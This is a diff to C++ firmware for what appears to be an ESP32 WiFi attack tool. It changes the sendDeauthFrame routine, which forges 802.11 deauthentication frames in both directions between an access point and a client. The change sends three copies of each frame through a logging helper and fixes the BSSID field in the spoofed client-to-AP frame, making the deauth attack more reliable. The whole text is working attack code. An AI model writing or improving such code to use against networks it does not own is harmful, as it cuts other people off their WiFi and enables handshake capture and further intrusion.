@@ -8893,6 +8893,38 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   WiFiScan::set_channel = channel;
   this->changeChannel(channel);
   delay(1);
+
+  auto transmit_deauth_copies = [this, channel](const char* direction) {
+    constexpr uint8_t copy_count = 3;
+    uint8_t successful_transmits = 0;
+    esp_err_t first_error = ESP_OK;
+
+    for (uint8_t copy = 0; copy < copy_count; ++copy) {
+      const esp_err_t result = esp_wifi_80211_tx(
+        WIFI_IF_AP,
+        deauth_frame_default,
+        sizeof(deauth_frame_default),
+        false);
+      if (result == ESP_OK) {
+        successful_transmits++;
+      }
+      else if (first_error == ESP_OK) {
+        first_error = result;
+      }
+    }
+
+    packets_sent += successful_transmits;
+    if (successful_transmits != copy_count) {
+      Serial.printf(
+        "Deauth TX failed (%s, channel %d): %u/%u sent, first error %s (0x%X)\n",
+        direction,
+        channel,
+        static_cast<unsigned int>(successful_transmits),
+        static_cast<unsigned int>(copy_count),
+        esp_err_to_name(first_error),
+        static_cast<unsigned int>(first_error));
+    }
+  };
   
   // Build AP source packet
   deauth_frame_default[4] = mac[0];
@@ -8916,12 +8948,8 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   deauth_frame_default[20] = bssid[4];
   deauth_frame_default[21] = bssid[5];      
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  // Send AP-to-client packet copies.
+  transmit_deauth_copies("AP->client");
 
   // Build AP dest packet
   deauth_frame_default[4] = bssid[0];
@@ -8938,19 +8966,15 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   deauth_frame_default[14] = mac[4];
   deauth_frame_default[15] = mac[5];
 
-  deauth_frame_default[16] = mac[0];
-  deauth_frame_default[17] = mac[1];
-  deauth_frame_default[18] = mac[2];
-  deauth_frame_default[19] = mac[3];
-  deauth_frame_default[20] = mac[4];
-  deauth_frame_default[21] = mac[5];      
+  deauth_frame_default[16] = bssid[0];
+  deauth_frame_default[17] = bssid[1];
+  deauth_frame_default[18] = bssid[2];
+  deauth_frame_default[19] = bssid[3];
+  deauth_frame_default[20] = bssid[4];
+  deauth_frame_default[21] = bssid[5];
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  // Send client-to-AP packet copies. Address 3 remains the AP BSSID.
+  transmit_deauth_copies("client->AP");
 }
 
 void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
